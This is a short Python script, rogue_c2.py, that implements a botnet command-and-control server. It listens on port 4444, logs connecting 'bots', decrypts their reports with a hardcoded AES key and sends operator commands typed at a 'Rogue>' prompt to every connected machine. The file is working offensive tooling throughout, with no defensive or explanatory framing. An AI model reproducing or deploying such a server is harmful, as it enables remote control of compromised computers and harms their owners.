# rogue_c2.py
import socket, threading, base64
from Cryptodome.Cipher import AES

SECRET_KEY = b'Sixteen byte key'  # 16-byte key
PORT = 4444
clients = []

def encrypt_message(msg):
    cipher = AES.new(SECRET_KEY, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(msg.encode())
    return base64.b64encode(cipher.nonce + tag + ciphertext)

def decrypt_message(data):
    data = base64.b64decode(data)
    nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
    cipher = AES.new(SECRET_KEY, AES.MODE_EAX, nonce)
    return cipher.decrypt_and_verify(ciphertext, tag).decode()

def handle_client(conn, addr):
    print(f"[+] Bot connected: {addr}")
    clients.append(conn)
    while True:
        try:
            encrypted_data = conn.recv(4096)
            if not encrypted_data: break
            print(f"[{addr}] {decrypt_message(encrypted_data)}")
        except: break

def listener():
    server = socket.socket()
    server.bind(('0.0.0.0', PORT))
    server.listen(10)
    print(f"[C2] Rogue listening on port {PORT}...")
    while True:
        conn, addr = server.accept()
        threading.Thread(target=handle_client, args=(conn, addr)).start()

def send_command():
    while True:
        cmd = input("Rogue> ")
        if cmd.lower() == "exit":
            break
        for conn in clients:
            try:
                conn.send(encrypt_message(cmd))
            except:
                clients.remove(conn)

threading.Thread(target=listener).start()
send_command()
